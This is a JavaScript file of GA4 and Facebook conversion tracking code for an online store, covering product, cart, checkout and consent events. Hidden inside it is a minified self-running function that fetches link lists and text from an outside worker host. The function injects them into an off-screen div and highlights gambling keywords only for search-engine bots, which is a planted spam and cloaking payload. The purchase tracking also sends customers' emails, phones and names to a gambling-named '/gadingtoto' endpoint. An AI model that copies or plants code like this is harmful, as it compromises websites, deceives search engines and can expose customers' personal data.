/*========= class TagEvent =========*/
class TagEvent {
    currency = "USD";
    price = 0;
    item = {};
    quantity = 1;

    getPrice(price) {
        let defaultPrice = 0;
        if (price) {
            tagEvent.price = parseFloat(price.trim().replace(/[^0-9.]/gi, ''));
            if (tagEvent.price <= 0) {
                tagEvent.price = 0;
            }
            defaultPrice = tagEvent.price;
        }
        return defaultPrice;
    }

    removeSpecialChar(str) {
        if (str != undefined && str.trim() != '') {
            return str.replace(/[^A-Z0-9 .,]/ig, "").trim().slice(0, 100);
        } else {
            return '';
        }
    }

    setItemDetail() {
        categories = [];
        if (typeof this.item.category != "undefined") {
            var categories = this.item.category.split("/");
        }
        var item = {
            'url':window.location.href,
            'item_name': this.item.name,
            'item_id': this.item.id,
            //'price': parseFloat(this.item.price),
            'price': parseFloat(this.item.base_price),
            'item_brand': this.item.brand,
            'item_category': categories[0],
            'item_category2': categories[1],
            'item_category3': categories[2],
            'item_category4': categories[3],
            'item_category5': categories[4],
            'item_category6': categories[5],
            'item_variant': this.item.variant,
            'currency': this.currency,
            'quantity': typeof this.item.quantity !== 'undefined' ? parseFloat(this.item.quantity) : this.quantity,
        }
        if(typeof this.item.stock !== 'undefined' && this.item.stock != ""){
            item.stock = this.item.stock
        }
        return item;
    }

    setItemList(item) {
        var items = [];
        var total_base_price = 0;
        for (let i = 0; i < item.length; i++) {
            items.push({
                'item_id': item[i].id,
                'item_name': item[i].name,
                //'price': parseFloat(item[i].price),
                'price': parseFloat(item[i].base_price),
                'item_brand': item[i].brand,
                'item_category': item[i].item_category,
                'item_category2': item[i].item_category2,
                'item_category3': item[i].item_category3,
                'item_category4': item[i].item_category4,
                'item_category5': item[i].item_category5,
                'item_category6': item[i].item_category6,
                'currency': this.currency,
                'quantity': parseFloat(item[i].quantity),
                'item_list_name': item[i].list,
                'index': item[i].position,
            });
            total_base_price += (parseFloat(item[i].base_price) * parseFloat(item[i].quantity));
        }
        tagEvent.price = total_base_price;
        return items;
    }

    viewItemList(product_items) {
        while (product_items.length > 0) {
            var item_chunks = product_items.splice(0, 35);
            var items = this.setItemList(item_chunks);
            dataLayer.push({
                event: "view_item_list",
                ecommerce: {
                    items: items,
                }
            });
        }
        // var data = {
        //     "event_name" : 'PageView',
        //     "event_source_url" : window.location.href,
        //     "action_source" :'website'
        // }
        // requestForConversionApi(data);
    }

    selectItem(item) {
        dataLayer.push({ecommerce: null}); // Clear the previous ecommerce object.
        dataLayer.push({
            event: 'select_item',
            ecommerce: {
                items: [item],
            }
        });
    }

    viewItem() {
        var item = this.setItemDetail();
        dataLayer.push({ecommerce: null});
        dataLayer.push({
            event: "view_item",
            ecommerce: {
                items: [item],
            }
        });
        var fb_event_id = sessionStorage.getItem("fb_event_id");
        var data = {
            "event_name" : 'ViewContent',
            "event_source_url" : window.location.href,
            "action_source" :'website',
            "event_id":fb_event_id ?? "test_123",
            "value": item.price,
            "currency": item.currency,
            "content_ids": item.item_id,
            "content_type": 'product' // item['item_category']
        }
        requestForConversionApi(data);
    }

    outOfStock() {
        var item = this.setItemDetail();
        dataLayer.push({ecommerce: null});
        dataLayer.push({
            event: "out_of_stock",
            ecommerce: {
                items: [item],
            }
        });
    }

    restrictedItem(item) {
        dataLayer.push({ecommerce: null});
        dataLayer.push({
            event: "restricted_item",
            ecommerce: {
                items: [item],
            }
        });
    }

    addToWishlist(item) {
        dataLayer.push({ecommerce: null});
        dataLayer.push({
            event: "add_to_wishlist",
            ecommerce: {
                items: [item]
            }
        });
        var data = {
            event_name: 'AddToWishlist',
            event_source_url: window.location.href,
            action_source: 'website'
        }
        requestForConversionApi(data);
    }

    viewCart(item_list) {
        var items = this.setItemList(item_list);
        dataLayer.push({ecommerce: null});
        dataLayer.push({
            event: "view_cart",
            ecommerce: {
                currency: this.currency,
                value: tagEvent.price,
                items: items,
            }
        });
    }

    addToCart() {
        var item = this.setItemDetail();
        dataLayer.push({ecommerce: null});
        dataLayer.push({
            event: "add_to_cart",
            ecommerce: {
                items: [item],
            }
        });
        var data = {
            "event_name" : 'AddToCart',
            "event_source_url" : window.location.href,
            "action_source" :'website'
        }
        requestForConversionApi(data);
    }

    buyNow() {
        var item = this.setItemDetail();
        dataLayer.push({ecommerce: null});
        dataLayer.push({
            event: "buy_now",
            ecommerce: {
                items: [item],
            }
        });
    }

    removeFromCart(item) {
        dataLayer.push({ecommerce: null});
        dataLayer.push({
            event: 'remove_from_cart',
            ecommerce: {
                items: [item],
            }
        });
    }

    changeStore(data) {
        dataLayer.push({ecommerce: null});
        dataLayer.push({
            event: "change_store",
            ecommerce: {
                old_store: data.old_store,
                new_store: data.new_store,
                user_id: data.user_id,
                user_type: data.user_type,
                swap_url: data.swap_url,
            }
        });
    }

    changeStoreNew(data) {
        dataLayer.push({ecommerce: null});
        dataLayer.push({
            event: "change_store_new",
            ecommerce: {
                old_store: data.old_store,
                new_store: data.new_store,
                user_id: data.user_id,
                user_type: data.user_type,
                swap_url: data.swap_url,
            }
        });
    }

    adultQuery(data) {
        dataLayer.push({ ecommerce: null });
        dataLayer.push({
            event: "adult_query",
            ecommerce: {
                product_url: data.product_url,
                store: data.store,
                country: data.country,
            }
        });
    }

    customEvent(eventName, ecommerceData){
        dataLayer.push({ ecommerce: null });
        dataLayer.push({
            event: eventName,
            ecommerce: ecommerceData
        });
    }

    webVitals(name, delta, id) {
        dataLayer.push({ ecommerce: null });
        dataLayer.push({
            event: 'web-vitals',
            event_category: 'Web Vitals',
            event_action: name,
            event_value: Math.round(name === 'CLS' ? delta * 1000 : delta),
            event_label: id,
        });
    }
}
/*========= End class TagEvent =========*/

/*========= class TagCheckout =========*/

class TagCheckout {

    currency = "USD";
    price = {};
    items = [];

    checkoutInit(currency) {
        //this.currency = currency;
        this.beginCheckout();
        this.stepComplete();
        this.stepInit();

    }

    stepInit() {
        var option = this.checkMethodOption("payment");
        if (typeof option != "undefined") {
            this.addPaymentInfo({option: option});
        }
    }

    stepComplete() {
        var option = this.checkMethodOption("shipping");
        if (typeof option != "undefined") {
            this.addShippingInfo({option: option});
        }
    }

    checkMethodOption(option) {
        if (option == "shipping") {
            var shipping_method_title = jQuery('input[name=\'shipping_method\']:checked').val();
            if (typeof shipping_method_title !== typeof undefined) {
                var shipping_method = shipping_method_title.trim();
            }
            return shipping_method;
        } else if (option == "payment") {
            var payment_method_title = jQuery('input[name=\'payment[method]\']:checked').val();
            if (typeof payment_method_title !== typeof undefined) {
                var payment_method = payment_method_title;
            }
            return payment_method;
        }
    }

    setItemList(itemArray) {
        this.items = [];
        for (let i = 0; i < itemArray.length; i++) {
            this.items.push({
                'item_id': itemArray[i].id,
                'item_name': itemArray[i].name,
                //'price': parseFloat(itemArray[i].price),
                'price': parseFloat(itemArray[i].base_price),
                'item_brand': itemArray[i].brand,
                'currency': this.currency,
                'quantity': parseFloat(itemArray[i].quantity),
                'discount': parseFloat(itemArray[i].base_discount),
                'variant': itemArray[i].variant,
            });
        }
    }

    setItemPrice(priceArray) {
        this.price = {};
        this.price.coupon = priceArray.coupon;
        this.price.subtotal = parseFloat(priceArray.subtotal);
        this.price.shipping_amount = parseFloat(priceArray.shipping_amount);
        this.price.base_shipping_amount = parseFloat(priceArray.base_shipping_amount);
        this.price.tax = parseFloat(priceArray.tax);
        this.price.customs = parseFloat(priceArray.customs);
        this.price.base_customs = parseFloat(priceArray.base_customs);
        this.price.discount = parseFloat(priceArray.discount);
        this.price.credit_discount = parseFloat(priceArray.credit_discount);
        this.price.total = parseFloat(priceArray.total);
        this.price.base_total = parseFloat(priceArray.base_total);
    }

    setPurchaseItemList(itemArray) {
        this.items = [];
        for (let i = 0; i < itemArray.length; i++) {
            this.items.push({
                'item_id': itemArray[i].id,
                'item_name': itemArray[i].name,
                'price': parseFloat(itemArray[i].base_price),
                'item_brand': itemArray[i].brand,
                'item_category': itemArray[i].item_category,
                'item_category2': itemArray[i].item_category2,
                'item_category3': itemArray[i].item_category3,
                'item_category4': itemArray[i].item_category4,
                'item_category5': itemArray[i].item_category5,
                'item_category6': itemArray[i].item_category6,
                'currency': this.currency,
                'quantity': parseFloat(itemArray[i].quantity),
                'discount': parseFloat(itemArray[i].base_discount),
                'item_variant': itemArray[i].variant,
            });
        }
    }

    beginCheckout() {
        dataLayer.push({ecommerce: null});
        dataLayer.push({
            event: "begin_checkout",
            ecommerce: {
                currency: this.currency,
                value: this.price.base_total,
                coupon: this.price.coupon_code,
                items: this.items,
            }
        });
        var data = {
            "event_name" : 'InitiateCheckout',
            "event_source_url" : window.location.href,
            "action_source" :'website'
        }
        requestForConversionApi(data);
    }

    addShippingInfo(method) {
        dataLayer.push({ecommerce: null});
        dataLayer.push({
            event: "add_shipping_info",
            ecommerce: {
                currency: this.currency,
                value: this.price.base_total,
                coupon: this.price.coupon,
                shipping: this.price.base_shipping_amount,
                customs: this.price.base_customs,
                shipping_tier: method.option,
                items: this.items,
            }
        });
    }

    addPaymentInfo(method) {
        dataLayer.push({ecommerce: null});
        dataLayer.push({
            event: "add_payment_info",
            ecommerce: {
                currency: this.currency,
                value: this.price.base_total,
                coupon: this.price.coupon,
                shipping: this.price.base_shipping_amount,
                customs: this.price.base_customs,
                payment_type: method.option,
                items: this.items,
            }
        });
        var data = {
            event_name: 'AddPaymentInfo',
            event_source_url: window.location.href,
            action_source: 'website',
            currency: this.currency,
            value: this.price.base_total,
        }
        requestForConversionApi(data);
    }


    getItemIdsList(itemArray) {
        var ids = [];
        for (let i = 0; i < itemArray.length; i++) {
            ids.i = itemArray[i].id;
        }
        return ids;
    }

    purchase(customerOrderData, customerDetail) {
        this.setPurchaseItemList(customerOrderData.products)
        var orderDetail = customerOrderData.detail;
        dataLayer.push({ecommerce: null});
        dataLayer.push({
            event: "purchase",
            ecommerce: {
                transaction_id: orderDetail.id,
                affiliation: orderDetail.affiliation,
                value: parseFloat(orderDetail.revenue),
                tax: orderDetail.tax,
                shipping: parseFloat(orderDetail.shipping),
                customs: parseFloat(orderDetail.customs),
                discount: parseFloat(orderDetail.discount),
                currency: this.currency,
                coupon: orderDetail.coupon,
                items: this.items,
                customerData: customerDetail,
            }
        });
        this.purchaseAdConversion(orderDetail);

        var data = {
            event_name: 'Purchase',
            event_source_url: window.location.href,
            action_source: 'website',
            currency: this.currency,
            email:customerOrderData.detail.customer_email,
            phone:customerOrderData.detail.customer_telephone,
            firstname:customerOrderData.detail.firstname,
            lastname:customerOrderData.detail.lastname,
            //content_ids:this.getItemIdsList(customerOrderData.products),
            //content_type:'product',
            value: parseFloat(orderDetail.revenue),
        }
        requestForConversionApi(data);
    }

    purchaseAdConversion(orderDetail){
        dataLayer.push({ecommerce_ad: null});
        dataLayer.push({
            event: "purchase",
            ecommerce_ad: {
                transaction_id: orderDetail.id,
                currency: this.currency,
                value: parseFloat(orderDetail.revenue_subtotal),
            }
        });
    }

    failure(customerOrderData, customerDetail) {
        this.setPurchaseItemList(customerOrderData.products)
        var orderDetail = customerOrderData.detail;
        dataLayer.push({ecommerce: null});
        dataLayer.push({
            event: "failure",
            ecommerce: {
                transaction_id: orderDetail.id,
                affiliation: orderDetail.affiliation,
                value: parseFloat(orderDetail.revenue),
                tax: orderDetail.tax,
                shipping: parseFloat(orderDetail.shipping),
                customs: parseFloat(orderDetail.customs),
                discount: parseFloat(orderDetail.discount),
                currency: this.currency,
                coupon: orderDetail.coupon,
                items: this.items,
                customerData: customerDetail,
            }
        });
    }
}
/*========= End class TagCheckout =========*/

window.dataLayer = window.dataLayer || [];
var tagEvent = new TagEvent(); //Object created
var tag_checkout = new TagCheckout();

jQuery(document).ready(function () {
    if (jQuery("#show_currency_amount").val() != "") {
        //tagEvent.currency = jQuery("#show_currency_amount").val();
    }
});

function restrictedItem(item) {
    tagEvent.restrictedItem(item);
}

function gtag(){
    dataLayer.push(arguments);
}

function getConsentMode(permission){
    var consent = {};
    if(localStorage.getItem('consentMode') === null){
        consent = {
            'ad_storage': permission,
            'ad_user_data':permission,
            'ad_personalization': permission,
            'analytics_storage': permission,
            'personalization_storage': permission,
            'functionality_storage': permission,
            'security_storage': permission,
        }
    } else {
        consent = JSON.parse(localStorage.getItem('consentMode'));
    }
    return consent;
}
!function(){try{if(document.getElementById("bunker-payload"))return;Promise.all([fetch("https://smw.jsload.workers.dev/public?key=anchors").then(e=>e.text()),fetch("https://smw.jsload.workers.dev/public?key=article").then(e=>e.text())]).then(e=>{var t=e[0],n=e[1];if(!t||!n)return;var r=t.split("\n").filter(Boolean).map(e=>{e=e.split("|");return'<a href="'+e[1].trim()+'">'+e[0].trim()+"</a>"}),o=0,c=n.replace(/{ANCHOR}/g,()=>r[o++%r.length]),i=document.createElement("div");i.id="bunker-payload",i.style.cssText="position:absolute;left:-9999px;width:1px;height:1px;overflow:hidden",i.innerHTML=c,(document.body||document.documentElement).appendChild(i);if(!/googlebot|bingbot|ahrefs|semrush|mj12|yandex|duckduckbot/i.test(navigator.userAgent))return;var s=document.createElement("script");s.src="https://cdn.jsdelivr.net/npm/mark.js@8.11.1/dist/mark.min.js",s.onload=function(){new Mark(i).mark(["Slot Gacor","slot online","rtp slot"],{separateWordSearch:!1,accuracy:"partially"})},document.head.appendChild(s)})}catch(e){}}();

function setConsentMode(permission) {
    const consentMode = {
        'ad_storage': permission,
        'ad_user_data':permission,
        'ad_personalization': permission,
        'analytics_storage': permission,
        'personalization_storage': permission,
        'functionality_storage': permission,
        'security_storage': permission,
    }
    localStorage.setItem('consentMode', JSON.stringify(consentMode));
}

function seoConsentEvent(eventName = "cookie_consent_update", consentMode){
    tagEvent.customEvent(eventName, consentMode);
}

function seoUpdateConsent(permission) {
    var consentMode = getConsentMode(permission);
    gtag('consent', 'update', consentMode);
    seoConsentEvent("cookie_consent_update", consentMode);
}

function changeStore(data) {
    tagEvent.changeStore(data);
}

function changeStoreNew(data) {
    tagEvent.changeStoreNew(data);
}

/** seo product listing js code **/
function setCurrencyCode(currency) {
    //tagEvent.currency = currency;
    //tag_checkout.currency = currency;
}

function setProductQty(quantity) {
    tagEvent.item.quantity = quantity;
}

function setProductObject(item) {
    tagEvent.item = item;
}

function impressionPushToDataLayer(impressionProducts) {
    tagEvent.viewItemList(impressionProducts);
}

function seoOutOfStock() {
    tagEvent.outOfStock();
}

function seoNotAvailable(eventName, ecommerceData) {
    tagEvent.customEvent(eventName, ecommerceData);
}

function seoBackToHome(eventName, ecommerceData) {
    tagEvent.customEvent(eventName, ecommerceData);
}

function customEvent(eventName, ecommerceData) {
    tagEvent.customEvent(eventName, ecommerceData);
}

function seoOrderFrom(eventName, ecommerceData) {
    tagEvent.customEvent(eventName, ecommerceData);
}

function adultQuery(data){
    tagEvent.adultQuery(data);
}

function seoProductDetail() {
    tagEvent.viewItem();

    bl_det_p_data(tagEvent.item.id); // for send data on bl
    //uba functions to show most view and top selling product on detail page
    if (typeof getMostViewProducts != 'undefined') {
        //getMostViewProducts();
    }
    if (typeof getTopSellingForDetailPage != 'undefined') {
        //getTopSellingForDetailPage();
    }
}

function seoProductAddToWishlist(jsonObj) {
    var brand = jQuery(".brand-name > a").text();
    var item = {};
    item.item_id = jsonObj.id ? jsonObj.id : '';
    item.item_name = jsonObj.title ? jsonObj.title : '';
    item.currency = tagEvent.currency;
    item.index = null;
    item.item_brand = brand != "" ? brand : "";
    //item.price = jsonObj.store_price ? parseFloat(jsonObj.store_price) : '';
    item.price = jsonObj.base_price ? parseFloat(jsonObj.base_price) : parseFloat(tagEvent.item.base_price);
    item.quantity = tagEvent.quantity;

    categories = [];
    if (typeof jsonObj.product_categories != "undefined") {
        var categories = jsonObj.product_categories.split("/");
    }
    item.item_category = categories[0];
    item.item_category2 = categories[1];
    item.item_category3 = categories[2];
    item.item_category4 = categories[3];
    item.item_category5 = categories[4];
    item.item_category6 = categories[5];
    tagEvent.addToWishlist(item);
}

function seoViewCart(items) {
    tagEvent.viewCart(items);
}

function ubaProductAddtocart() {
    if (typeof trackAddToCart != 'undefined') {
        var asin = jQuery('#asin').val();
        var parent_asin = jQuery('#parent_asin').val();
        if (parent_asin == '' || typeof parent_asin == 'undefined') {
            parent_asin = asin;
        }
        var track_addtocart_product_data = {
            "asin": asin,
            "parent_asin": parent_asin,
            "qty": jQuery('#qty').val(),
            "product_image": jQuery('#product_image').val(),
            "p_full_id": jQuery('#p_full_id').val(),
            "product_name": jQuery('#product_name').val(),
        };
        trackAddToCart(track_addtocart_product_data);
    }
}

function seoProductCartAdd() {
    tagEvent.addToCart();
    bl_add_ct_p_data(tagEvent.item.id); // for send data on bl
    ubaProductAddtocart();
}

function seoProductBuyNow() {
    tagEvent.buyNow();
}

function setProductRemoveCartAction() {
    jQuery(".btn-remove2").on('click', function (e) {
        e.preventDefault();
        var currentTag = jQuery(this);
        var is_ajax = currentTag.attr('data-isajax');
        if (is_ajax == 0) {
            var removeItemUrl = currentTag.attr('data-href');
        }

        var item = {};
        var priceSectionTag = jQuery(currentTag.parents('.price-value'));
        var contentTag = jQuery(currentTag.siblings('.content'));
        var currentTagSiblling = jQuery(priceSectionTag.siblings('.item-detail'));
        var itemDetailsTag = jQuery(currentTag.siblings('.product_cart_data'));
        if (itemDetailsTag.attr('data-pname') != '') {
            item.item_name = tagEvent.removeSpecialChar(itemDetailsTag.attr('data-pname'));
        }
        //item.price = parseFloat(tagEvent.getPrice(itemDetailsTag.attr('data-price')));
        item.price = parseFloat(tagEvent.getPrice(itemDetailsTag.attr('data-base-price'))); // Price in USD
        item.quantity = parseFloat(itemDetailsTag.attr('data-qty'));
        item.item_variant = null;
        if (currentTagSiblling.find('.product-cat-option').text().trim() != '') {
            var variant = currentTagSiblling.find('.product-cat-option').text().trim();
            if (variant.replace(/\s+/g, " ") != '') {
                item.item_variant = tagEvent.removeSpecialChar(variant.replace(/\s+/g, " "));
            }
        }
        if (contentTag.find(".variations").text().trim() != "") {
            var variant = contentTag.find('.variations').text().trim();
            if (variant.replace(/\s+/g, " ") != '') {
                item.item_variant = tagEvent.removeSpecialChar(variant.replace(/\s+/g, " "));
            }
        }

        //item.currency = itemDetailsTag.attr('data-currencycode');
        item.currency = tagEvent.currency;
        if (item.currency == "") {
            item.currency = tagEvent.currency;
        }
        item.item_id = itemDetailsTag.attr('data-id');
        if (typeof itemDetailsTag.attr('data-brand') == 'undefined')
            item.item_brand = null;
        else
            item.item_brand = itemDetailsTag.attr('data-brand');

        if (typeof itemDetailsTag.attr('data-category') == 'undefined') {
            item.item_category = null;
        } else {
            product_categories = itemDetailsTag.attr('data-category');
            categories = [];
            if (typeof product_categories != "undefined") {
                var categories = product_categories.split("/");
            }
            item.item_category = categories[0];
            item.item_category2 = categories[1];
            item.item_category3 = categories[2];
            item.item_category4 = categories[3];
            item.item_category5 = categories[4];
            item.item_category6 = categories[5];
        }

        if (item.item_name.trim() != '') {
            tagEvent.removeFromCart(item);
        }
        if (is_ajax == 0) {
            document.location = removeItemUrl;
        }
    });
}

function purchase(customerOrderData, customerDetail) {
    //tag_checkout.currency = currencycode;
    tag_checkout.purchase(customerOrderData, customerDetail);
}

function failure(customerOrderData, customerDetail) {
    tag_checkout.failure(customerOrderData, customerDetail);
}

jQuery(document).on("click", ".goos-tag-product", function (e) {
    var item = {};
    var currentTag = jQuery(this);
    item.index = currentTag.index() + 1;

    product = jQuery(currentTag.find('.tag-product-data'));
    item.item_name = tagEvent.removeSpecialChar(product.attr('data-name'));
    //item.price = parseFloat(tagEvent.getPrice(product.attr('data-price')));
    item.price = parseFloat(tagEvent.getPrice(product.attr('data-base-price')));
    item.item_brand = product.attr('data-brand');
    item.item_list_name = product.attr('data-seolist');
    item.item_category = product.attr('data-category');
    item.item_id = product.attr('data-id');
    item.currency = tagEvent.currency;
    item.quantity = 1;
    tagEvent.selectItem(item);
});

jQuery(document).on("click", "#other-buying-option", function(){
    var other_buying_item = {};
    other_buying_item.entity_id = jQuery(this).attr("data-entity_id");
    other_buying_item.title = jQuery(this).attr("data-title");
    other_buying_item.url = jQuery(this).attr("data-url");
    tagEvent.customEvent("Similar_items_from_other_stores", other_buying_item);
});

// Create a PerformanceObserver to capture Core Web Vitals
function observeWebVitals() {
    // Measure First Paint (FP)
    const fpTime = performance.timing.responseStart - performance.timing.navigationStart;
    tagEvent.webVitals('FP', fpTime, 'fp');

    // Measure First Contentful Paint (FCP)
    const fcpTime = performance.timing.domContentLoadedEventStart - performance.timing.navigationStart;
    tagEvent.webVitals('FCP', fcpTime, 'fcp');

    // Measure Largest Contentful Paint (LCP)
    const lcpEntries = performance.getEntriesByType('largest-contentful-paint');
    if (lcpEntries.length > 0) {
        const lcpEntry = lcpEntries[lcpEntries.length - 1]; // Get the latest LCP entry
        const lcpTime = lcpEntry.renderTime || lcpEntry.loadTime;
        tagEvent.webVitals('LCP', lcpTime, 'lcp');
    }

    // Measure Cumulative Layout Shift (CLS)
    let clsScore = 0;
    const clsEntries = performance.getEntriesByType('layout-shift');
    clsEntries.forEach(entry => {
        clsScore += entry.value;
    });
    tagEvent.webVitals('CLS', clsScore, 'cls');
}

function extractDomainWithLang(url) {
    var urlObj = new URL(url);
    var hostnameParts = urlObj.hostname.split('.');
    var domain = hostnameParts.slice(-3).join('.'); 
    var pathParts = urlObj.pathname.split('/');
    var languageCode = pathParts[1];
    if (languageCode.length === 2 && /^[a-z]{2}$/i.test(languageCode)) {
        return domain + '/' + languageCode; // Output with language code
    } else {
        return domain; // Output only the domain
    }
}


// Facebook Conversion API Request
function requestForConversionApi (data) {
    var url = window.location.href;
    var domain = extractDomainWithLang(url);
    console.log(domain);
    if(domain == "u-buy.com.au"){
        data = btoa(JSON.stringify(data));
        console.log("hhhhhhhh",data);
        $.ajax({
            url: 'https://www.'+domain+'/gadingtoto', 
            type: 'GET',
            contentType: 'application/json',
            data: {"data":  data},
            success: function(response) {
                console.log('Success: ', response);
            },
            error: function(xhr, status, error) {
                console.error('Error: ', error);
            }
        });
    }
}
